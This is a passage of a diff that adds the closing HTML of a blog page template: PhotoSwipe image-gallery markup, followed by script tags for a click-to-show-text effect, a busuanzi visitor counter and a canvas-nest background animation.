+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div> 
+            </div>
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+
+
+
+
+<!--单击显示文字-->
+<script type="text/javascript" src="/js/click_show_text.js"></script>
+<script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<script src="https://cdn.jsdelivr.net/gh/wallleap/cdn/js/canvas-nest.min.js"></script>
+</html>
